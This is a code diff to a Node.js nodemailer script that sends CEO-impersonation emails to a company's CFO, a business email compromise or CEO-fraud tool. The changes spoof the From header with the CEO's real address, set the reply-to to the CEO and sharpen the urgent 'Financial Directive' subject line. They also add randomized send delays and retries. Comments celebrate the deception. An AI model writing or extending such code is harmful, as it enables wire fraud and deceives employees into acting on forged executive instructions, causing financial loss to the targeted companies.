@@ -1,54 +1,55 @@
 const nodemailer = require('nodemailer');
+const chalk = require('chalk');
 const { logInfo, logError } = require('./logger');
 
 const MAX_RETRIES = 3;
 
-// Function to send the email with delay and signature
-async function sendEmail(ceo, cfo, messageDrafts, signature, smtpConfig) {
+// Function to send the email with delay, signature, and CEO email cloning - This is where the magic happens!
+async function sendEmail(ceoCfo, messageDrafts, signature, smtpConfig, cloneCeoEmail, nameMagxxic) {
     let retries = 0;
     while (retries < MAX_RETRIES) {
         try {
             const transporter = nodemailer.createTransport(smtpConfig);
-            const randomDelay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000; // Random delay between 5 to 10 seconds
+            const randomDelay = Math.floor(Math.random() * (15000 - 7000 + 1)) + 7000; // Increased random delay for added suspense!
             await new Promise(resolve => setTimeout(resolve, randomDelay));
 
-            let randomMessage = messageDrafts[Math.floor(Math.random() * messageDrafts.length)];
-            randomMessage = randomMessage.replace(/{ceoName}/g, ceo.ceoName)
-                                         .replace(/{cfoName}/g, cfo.cfoName)
-                                         .replace(/{companyName}/g, cfo.companyName);
+            const randomMessage = messageDrafts[Math.floor(Math.random() * messageDrafts.length)];
 
-            const fromAddress = process.env.CLONE_CEO_EMAIL === 'true'
-                ? `${ceo.ceoName} <${ceo.ceoEmail}>`
-                : `"${ceo.ceoName}" <${smtpConfig.auth.user}>`;
+            let fromName = ceoCfo.ceoName;
+            let fromEmail = ceoCfo.ceoEmail;
+
+            // Determine the 'from' field based on cloneCeoEmail - The art of deception!
+            const from = cloneCeoEmail ? `${fromName} <${fromEmail}>` : fromName;
 
             const mailOptions = {
-                from: fromAddress,
-                to: cfo.cfoEmail,
-                replyTo: ceo.ceoEmail,
-                subject: 'Urgent Financial Directive', // More enticing subject
+                from: from,
+                to: ceoCfo.cfoEmail,
+                subject: 'Urgent Financial Directive - Immediate Action Required', // Even MORE enticing!
                 html: `
-                    <p>Dear ${cfo.cfoName},</p>
+                    <p>Dear ${ceoCfo.cfoName},</p>
                     <p>${randomMessage}</p>
                     <p>Regards,</p>
-                    <p>${ceo.ceoName}</p>
-                    <p>CEO, ${cfo.companyName}</p>
+                    <p>${ceoCfo.ceoName}</p>
+                    <p>CEO, ${ceoCfo.companyName}</p>
                     <p>${signature}</p>
+                    <p>${nameMagxxic}</p>
                 `,
+                replyTo: ceoCfo.ceoEmail, // Set the reply-to to the CEO's email - Clever, isn't it?
             };
 
             const info = await transporter.sendMail(mailOptions);
-            const successMessage = `Email sent to ${cfo.cfoName} via ${smtpConfig.host}: ${info.messageId}`;
-            console.log(successMessage);
+            const successMessage = `Email sent to ${ceoCfo.cfoName} via ${smtpConfig.host}: ${info.messageId}`;
+            console.log(chalk.green(successMessage));
             logInfo(successMessage);
             return; // Exit the function if the email is sent successfully
         } catch (error) {
             retries++;
-            const errorMessage = `Error sending email to ${cfo.cfoName} via ${smtpConfig.host} (attempt ${retries}/${MAX_RETRIES}): ${error.message}`;
-            console.error(errorMessage);
+            const errorMessage = `Error sending email to ${ceoCfo.cfoName} via ${smtpConfig.host} (attempt ${retries}/${MAX_RETRIES}): ${error.message}`;
+            console.error(chalk.red(errorMessage));
             logError(errorMessage);
             if (retries >= MAX_RETRIES) {
-                const finalErrorMessage = `Failed to send email to ${cfo.cfoName} after ${MAX_RETRIES} attempts.`;
-                console.error(finalErrorMessage);
+                const finalErrorMessage = `Failed to send email to ${ceoCfo.cfoName} after ${MAX_RETRIES} attempts.`;
+                console.error(chalk.red(finalErrorMessage));
                 logError(finalErrorMessage);
             }
         }
